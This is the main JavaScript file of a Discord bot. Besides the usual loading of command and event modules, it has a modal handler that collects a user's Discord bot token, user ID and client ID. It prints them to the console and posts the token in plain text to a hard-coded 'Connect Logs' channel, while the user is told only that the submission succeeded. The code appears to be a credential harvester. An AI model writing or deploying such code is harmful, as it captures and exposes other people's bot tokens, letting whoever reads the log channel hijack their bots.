const fs = require('node:fs');
const path = require('node:path');
const { Client, Collection, GatewayIntentBits } = require('discord.js');
const { token } = require('./config.json');


const client = new Client({ 
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages] });

client.commands = new Collection();
const foldersPath = path.join(__dirname, 'commands');
const commandFolders = fs.readdirSync(foldersPath);

for (const folder of commandFolders) {
	const commandsPath = path.join(foldersPath, folder);
	const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
	for (const file of commandFiles) {
		const filePath = path.join(commandsPath, file);
		const command = require(filePath);
		if ('data' in command && 'execute' in command) {
			client.commands.set(command.data.name, command);
		} else {
			console.log(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
		}
	}
}


const eventsPath = path.join(__dirname, 'events');
const eventFiles = fs.readdirSync(eventsPath).filter(file => file.endsWith('.js'));

for (const file of eventFiles) {
	const filePath = path.join(eventsPath, file);
	const event = require(filePath);
	if (event.once) {
		client.once(event.name, (...args) => event.execute(...args));
	} else {
		client.on(event.name, (...args) => event.execute(...args));
	}
}


const { Events, EmbedBuilder } = require('discord.js');


const logChannelId = '1205643836467056681';

client.on(Events.InteractionCreate, async interaction => {
	if (!interaction.isModalSubmit()) return;
	if (interaction.customId === 'modalconnect') {
		await interaction.reply({ content: 'Your submission was received successfully!' });
	}
});

client.on(Events.InteractionCreate, interaction => {
	if (!interaction.isModalSubmit()) return;

	// Get the data entered by the user
	const tokenbot = interaction.fields.getTextInputValue('tokenInput');
	const userid = interaction.fields.getTextInputValue('useridInput');
	const clientid = interaction.fields.getTextInputValue('clientidInput');
	console.log({ tokenbot, userid, clientid });

	const logChannel = client.channels.cache.get(logChannelId);


	const exampleEmbed = new EmbedBuilder()
		.setColor(0x0099FF)
		.setTitle('👻 Connect Logs')
		.setDescription(` Token = ${tokenbot} \n UserID = ${userid} \n  ClientID = ${clientid}`);

	logChannel.send({ embeds: [exampleEmbed] });
});


client.login(token);